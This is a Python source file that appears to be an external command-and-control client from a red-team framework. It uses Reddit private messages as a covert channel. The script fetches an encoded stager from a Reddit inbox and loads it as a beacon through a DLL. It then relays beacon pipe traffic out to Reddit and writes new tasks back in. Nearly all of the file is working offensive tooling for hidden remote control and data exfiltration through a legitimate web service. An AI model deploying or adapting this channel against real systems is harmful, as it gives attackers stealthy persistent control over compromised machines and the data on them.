from ctypes import *
from ctypes.wintypes import *
import sys
import os
import struct

# Encoder imports:
import base64
import urllib

# Transport imports:
import praw
from time import sleep

# START GHETTO CONFIG, should be read in when compiled...
CLIENT_ID = ""
CLIENT_SECRET = ""
PASSWORD = ""
USER_AGENT = "I AM TOTALLY MALWARE by /u/"
USERNAME = ""
SEND_NAME = "Resp4You" # Subject of PM
RECV_NAME = "New4You"
# END GHETTO CONFIG

 THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
	data = base64.b64encode(data)
	return urllib.quote_plus(data)[::-1]

def decode(data):
	data = urllib.unquote(data[::-1])
	return base64.b64decode(data)
# </encoder functions>

# <transport functions>

global TASK_ID
TASK_ID = ""

def prepTransport():
	# Auth as a script app
	global reddit # DEBUG: Not sure if needed
	reddit = praw.Reddit(client_id=CLIENT_ID,
		client_secret=CLIENT_SECRET,
		password=PASSWORD,
		user_agent=USER_AGENT,
		username=USERNAME)
	# Debug, verify that we are connected
	print "We have successfully authenticated: %s" %(reddit)
	return reddit

def sendData(data):
	# Because we're keeping the taskid, we can easily support parsing multiple
	#    tasks later
	reddit.redditor(USERNAME).message(SEND_NAME, encode(data))
	return 0

def recvData():
		# Here, we're going to assume the only messages in the inbox with our 
	#   subject are relevant and contain a full task or response, requiring only one task at a time
	task = ""
	while True:
		for message in reddit.inbox.messages(limit=1):
			# Waiting for a new task
			if message.id <= TASK_ID:
				sleep(5)
				pass
			# Got our new task
			if message.subject == RECV_NAME:
				task = message.body
				TASK_ID = message.id
				break
			# Hopefully you never hit this
			else:
				sleep(5)
				pass
	return decode(task)

# </transport functions>

maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe,mem,maxlen)
	if l < 0: return(-1)
	chunk=mem.raw[:l]
	return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
	sys.stdout.write('wp: %s\n'%len(chunk))
	sys.stdout.flush()
	print chunk
	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
	sleep(3) 
	print "ret=%s"%ret
	return(ret)

def go():
	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
	print "Waiting for stager..." # DEBUG
	p = recvData()
	print "Got a stager! loading..."
	sleep(2)
	# print "Decoded stager = " + str(p) # DEBUG
	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
	handle_beacon = start_beacon(p)

	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
	print "Loaded, and got handle to beacon. Getting METADATA."

	return handle_beacon

def interact(handle_beacon):
	while(True):
		sleep(1.5)
		
		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		print "relaying chunk to server"
		sendData(chunk)

		# LOGIC TO CHECK FOR A NEW TASK
		print "Checking for new tasks from transport"
		
		newTask = recvData()

		print "Got new task: %s" % (newTask)
		print "Writing %s bytes to pipe" % (len(newTask))
		r = WritePipe(handle_beacon, newTask)
		print "Write %s bytes to pipe" % (r)

# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# run the main loop
try:
	interact(handle_beacon)
except KeyboardInterrupt:
	print "Caught escape signal"
	sys.exit(0)
